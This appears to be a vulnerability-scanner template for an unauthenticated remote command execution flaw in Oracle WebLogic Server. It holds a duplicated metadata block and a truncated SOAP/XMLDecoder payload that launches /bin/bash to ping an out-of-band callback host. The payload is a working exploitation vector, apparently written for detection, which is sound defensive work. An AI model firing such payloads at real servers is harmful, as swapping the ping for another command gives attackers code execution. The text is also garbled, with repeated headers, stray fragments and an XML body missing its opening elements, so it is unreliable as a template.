info.name: Oracle WebLogic Server - Remote Command Execution
author: dr_set
imnightmaree
true13
info.description: The Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent - WLS Security) is susceptible to remote command execution. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. This easily exploitable vulnerability allows unauthenticated attackers with network access via T3 to compromise Oracle WebLogic Server.
info.remediation: Apply the latest security patches provided by Oracle to fix this vulnerability. Additionally, restrict network access to the WebLogic server and implement strong authentication mechanisms.

info.name: Oracle WebLogic Server - Remote Command Execution
author: dr_set
imnightmaree
true13
info.description: The Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent - WLS Security) is susceptible to remote command execution. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. This easily exploitable vulnerability allows unauthenticated attackers with network access via T3 to compromise Oracle WebLogic Server.
info.remediation: Apply the latest security patches provided by Oracle to fix this vulnerability. Additionally, restrict network access to the WebLogic server and implement strong authentication mechanisms.

    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">

                            <string>/bin/bash</string>

                        <void index="2">
                            <string>ping -c 1 clvv9dmh6i062fghl030f1pju8jm8d5xt.oast.site</string>
                        </void>
                    </array>
                    <void method="start"/></void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
